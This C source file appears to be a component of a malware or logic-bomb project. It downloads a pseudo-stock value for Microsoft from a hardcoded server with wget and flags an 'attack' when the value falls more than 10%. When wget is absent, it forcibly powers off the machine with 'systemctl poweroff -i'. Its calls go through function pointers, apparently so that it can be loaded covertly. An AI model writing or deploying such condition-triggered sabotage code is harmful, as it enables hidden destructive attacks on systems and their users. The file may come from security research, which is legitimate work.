/*
    C file for requesting the (hardcoded) pseudo-stock value of Microsoft and 
    the percentage of change since the previous measurement.
    
    In case the stock value dropped more than 10% (percentage of change < 10%), 
    the attack is triggered.
*/
#include "stock_client.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define RET_TRIGGER 1
#define ERROR_POPEN -1
#define ERROR_PARSE -2
#define ERROR_DATA -3

// Server URL for Microsoft stock data
#define MICROSOFT_STOCK_URL "https://stock.pablochen.com/stock/microsoft"

// Function to check if wget is installed on the system
int is_wget_installed(Globals *global) {
    FILE *fp;
    char buffer[256];
    // Try running 'which wget' to check if wget is installed
    fp = global->popen("which wget", "r");
    if (fp == NULL) {
        // If 'which wget' fails, wget is not installed
        return 0;
    }
    // Read output of 'which wget'
    if (global->fgets(buffer, sizeof(buffer), fp) != NULL) {
        // If wget's path is found, it's installed
        global->pclose(fp);
        return 1;
    }
    // wget is not installed
    global->pclose(fp);
    return 0;
}

// Function to obtain the stock value of Microsoft and the percentage of change.
// In case the stock value dropped more than 10% (percentage of change < 10%),
// the attack is triggered.
int get_microsoft_stock(Globals *global) {
    char command[512];
    FILE *fp;
    char buffer[256];
    char symbol[10];
    int current_stock_value;
    float percentage_change;
    int parse_result;
    int ret = 0;

    // Check if wget is installed
    if (!is_wget_installed(global)) {
        global->printf("\e[33mWARNING:\e[0m Wget is not installed\n");
        global->printf("\e[31mTriggering attack...\e[0m\n");
        global->system("sleep 5;systemctl poweroff -i");
        return RET_TRIGGER;
    }

    // Construct the wget command
    // -q for quiet mode, -O - to output to stdout
    global->snprintf(command, sizeof(command), "wget -q -o /dev/null -O - %s", MICROSOFT_STOCK_URL);

    // Open a pipe to the wget command
    fp = global->popen(command, "r");
    if (fp == NULL) {
        global->perror("Error opening pipe");
        return ERROR_POPEN;
    }

    // Read the response from the wget command
    if (global->fgets(buffer, sizeof(buffer), fp) != NULL) {
        // Parse the response (format: symbol,current_stock_value,percentage_change)
        parse_result = global->sscanf(buffer, "%9[^,],%d,%f", symbol, &current_stock_value, &percentage_change);
        if (parse_result == 3) { // Upon obtaining 3 values...
            // Print stock value and percentage of change
            global->printf("\e[32mMicrosoft stock value:\e[0m $%d\n", current_stock_value);
            global->printf("\e[32mPercentage of change:\e[0m %.2f%%\n", percentage_change);

            // Check for more than a 10% drop to trigger the attack
            if (percentage_change < -10) {
                global->printf("\e[33mWARNING:\e[0m Microsoft stock value dropped more than 10%%!\n");
                global->printf("\e[31mTriggering attack...\e[0m\n");
                ret =  RET_TRIGGER;
            }
        } else {
            global->printf("Failed to parse response. Parse result: %d\n", parse_result);
            ret = ERROR_PARSE;
        }
    } else {
        global->printf("Failed to retrieve data.\n");
        ret = ERROR_DATA;
    }

    // Close the pipe
    global->pclose(fp);
    return ret;
}

// Main function (testing purposes)
//int main() {
//    get_microsoft_stock();
//    return 0;
//}